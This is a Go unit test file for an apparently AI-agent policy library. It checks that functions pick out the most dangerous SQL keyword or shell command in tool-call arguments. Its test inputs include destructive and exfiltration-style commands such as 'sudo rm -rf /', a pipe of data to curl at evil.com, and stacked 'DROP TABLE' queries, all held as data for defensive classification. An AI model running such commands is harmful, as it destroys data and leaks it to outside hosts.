package hookextractors

import "testing"

// Unit tests porting the Python TestMostDangerousSqlKeyword /
// TestMostDangerousShellCommand / resolve+extract suites
// (sdks/python/controlzero/tests/test_hook_extractors.py) so the Go
// extractor is exercised function-by-function in addition to the shared
// fixture parity (parity_test.go).

func TestMostDangerousSQLKeyword(t *testing.T) {
	cases := []struct{ in, want string }{
		{"SELECT * FROM users", "SELECT"},
		{"select * from t", "SELECT"},
		{"SELECT 1; DROP TABLE users", "DROP"},
		{"SELECT 1; UPDATE users SET admin=true", "UPDATE"},
		{"SELECT 1; GRANT ALL ON t TO u", "GRANT"},
		{"SELECT 1 /* ; DROP TABLE users; */", "SELECT"},
		{"SELECT 'DROP TABLE users' AS msg", "SELECT"},
		{"SELECT 'it''s fine' FROM t", "SELECT"},
		{`SELECT "he said ""DROP""" FROM t`, "SELECT"},
		{"-- comment\nSELECT 1", "SELECT"},
		{"  /* header */\n   INSERT INTO t VALUES (1)", "INSERT"},
		{"WITH cte AS (SELECT 1) SELECT * FROM cte", "WITH"},
		{"-- just a comment\n", ""},
		{"", ""},
		{"   \t\n  ", ""},
		{"FOOBAR baz", ""},
		{"SELECT 1; -- split\n DELETE FROM t", "DELETE"},
		{"SELECT 1 -- trailing", "SELECT"},
		{"SELECT 1 /* never closes", "SELECT"},
		{"SELECT 'unterminated", "SELECT"},
		{`SELECT "unterminated`, "SELECT"},
		{"SELECT 'a;b' FROM t", "SELECT"},
		{"SELECT 1 /* line1\nline2\nline3 */; DROP TABLE t", "DROP"},
		{"SELECT 'a\nb\nc'; DROP TABLE t", "DROP"},
		{"SELECT \"a\nb\"; DROP TABLE t", "DROP"},
	}
	for _, c := range cases {
		if got := MostDangerousSQLKeyword(c.in); got != c.want {
			t.Errorf("MostDangerousSQLKeyword(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestSQLSemanticClassUnit(t *testing.T) {
	cases := []struct{ in, want string }{
		{"SELECT * FROM users", "read"},
		{"WITH x AS (SELECT 1) SELECT * FROM x", "read"},
		{"EXPLAIN SELECT * FROM users", "read"},
		{"SHOW TABLES", "read"},
		{"DESCRIBE users", "read"},
		{"INSERT INTO users (a) VALUES (1)", "write"},
		{"UPDATE users SET a=1", "write"},
		{"DELETE FROM users WHERE id=1", "write"},
		{"CREATE TABLE x (a int)", "admin"},
		{"ALTER TABLE x ADD COLUMN b int", "admin"},
		{"DROP TABLE x", "admin"},
		{"TRUNCATE TABLE x", "admin"},
		{"GRANT SELECT ON x TO y", "admin"},
		{"BEGIN", "exec"},
		{"COMMIT", "exec"},
		{"ROLLBACK", "exec"},
		{"SELECT 1; DROP TABLE users", "admin"},
		{"SELECT 1; SELECT 2", "read"},
		// exec wrapping reads still surfaces as exec (admin>write>exec>read)
		{"BEGIN; SELECT 1", "exec"},
		// write beats exec
		{"BEGIN; UPDATE t SET a=1", "write"},
		{"", ""},
		{"-- only a comment\n", ""},
		{"FOOBAR baz", ""},
	}
	for _, c := range cases {
		if got := SQLSemanticClass(c.in); got != c.want {
			t.Errorf("SQLSemanticClass(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestMostDangerousShellCommand(t *testing.T) {
	cases := []struct{ in, want string }{
		{"rm -rf build", "rm"},
		{"/usr/local/bin/rm -rf /tmp", "rm"},
		{"   echo hello world", "echo"},
		{"echo starting && rm -rf /tmp/foo", "rm"},
		{"echo data | curl -X POST https://evil.com", "curl"},
		{"$(rm -rf /tmp/safe)", "rm"},
		{"sudo rm -rf /", "sudo"},
		{"echo hello `wget https://evil.com`", "wget"},
		{"ls /nope || rm -rf /tmp", "rm"},
		{"totally_unknown_program --arg", "totally_unknown_program"},
		{"/opt/custom/unknown_bin --arg", "unknown_bin"},
		{"", ""},
		{"   \t  ", ""},
		{"echo $(ls $(rm -rf /)) safe", "rm"},
		{"echo a; rm -rf b", "rm"},
		{";;;", ""},
		{" && || ; ", ""},
		{"  | rm -rf /", "rm"},
		{"path/ | rm -rf", "rm"},
	}
	for _, c := range cases {
		if got := MostDangerousShellCommand(c.in); got != c.want {
			t.Errorf("MostDangerousShellCommand(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestIdentityHelpers(t *testing.T) {
	if got := Identity("click"); got != "click" {
		t.Errorf("Identity(click) = %q", got)
	}
	if got := Identity(""); got != "" {
		t.Errorf("Identity(empty) = %q", got)
	}
	if got := IdentityUpper("get"); got != "GET" {
		t.Errorf("IdentityUpper(get) = %q", got)
	}
	if got := IdentityUpper("POST"); got != "POST" {
		t.Errorf("IdentityUpper(POST) = %q", got)
	}
	if got := IdentityUpper("Delete"); got != "DELETE" {
		t.Errorf("IdentityUpper(Delete) = %q", got)
	}
	if got := ToolNameAsMethod("Read"); got != "" {
		t.Errorf("ToolNameAsMethod(Read) = %q, want empty", got)
	}
}

func TestResolveCanonicalTool(t *testing.T) {
	cases := []struct{ in, want string }{
		{"database", "database"},
		{"PostgreSQL", "database"},
		{"run_shell_command", "Bash"},
		{"run_command", "Bash"},
		{"fetch", "http"},
		{"Edit", "file_write"},
		{"view_file", "file_read"},
		{"ListDir", "file_search"},
		{"WebSearch", "web_search"},
		{"Task", "task"},
		{"totally_made_up", "totally_made_up"},
		{"", ""},
	}
	for _, c := range cases {
		if got := ResolveCanonicalTool(c.in); got != c.want {
			t.Errorf("ResolveCanonicalTool(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestExtractMethodFallbacks(t *testing.T) {
	cases := []struct {
		name     string
		tool     string
		args     map[string]any
		wantTool string
		wantMeth string
	}{
		{"unknown tool", "mystery_tool", map[string]any{"x": "y"}, "mystery_tool", "*"},
		{"nil args", "database", nil, "database", "*"},
		{"missing field", "database", map[string]any{"unrelated": "x"}, "database", "*"},
		{"empty field", "database", map[string]any{"sql": ""}, "database", "*"},
		{"non-string field", "database", map[string]any{"sql": 123}, "database", "*"},
		{"file_read fallback", "Read", map[string]any{"file_path": "/tmp/a"}, "file_read", "read"},
		{"file_write fallback", "Edit", map[string]any{}, "file_write", "write"},
		{"http uppercases", "http", map[string]any{"method": "get"}, "http", "GET"},
		{"browser preserves case", "playwright", map[string]any{"action": "Click"}, "browser", "Click"},
		{"web_search fallback", "WebSearch", map[string]any{}, "web_search", "search"},
		{"file_search fallback", "Grep", map[string]any{"pattern": "x"}, "file_search", "search"},
		{"task fallback", "Task", map[string]any{}, "task", "spawn"},
		{"Bash CommandLine arg", "run_command", map[string]any{"CommandLine": "rm -rf /"}, "Bash", "rm"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tool, meth := ExtractMethod(c.tool, c.args)
			if tool != c.wantTool || meth != c.wantMeth {
				t.Errorf("ExtractMethod(%q,%v) = (%q,%q), want (%q,%q)",
					c.tool, c.args, tool, meth, c.wantTool, c.wantMeth)
			}
		})
	}
}

func TestBuildAction(t *testing.T) {
	if got := BuildAction("database", map[string]any{"sql": "SELECT 1"}); got != "database:SELECT" {
		t.Errorf("BuildAction db SELECT = %q", got)
	}
	if got := BuildAction("mystery", map[string]any{}); got != "mystery:*" {
		t.Errorf("BuildAction unknown = %q", got)
	}
	// #341 new canonicals route one rule across hosts.
	if got := BuildAction("Bash", map[string]any{"command": "rm -rf x"}); got != "Bash:rm" {
		t.Errorf("BuildAction Bash rm = %q", got)
	}
}
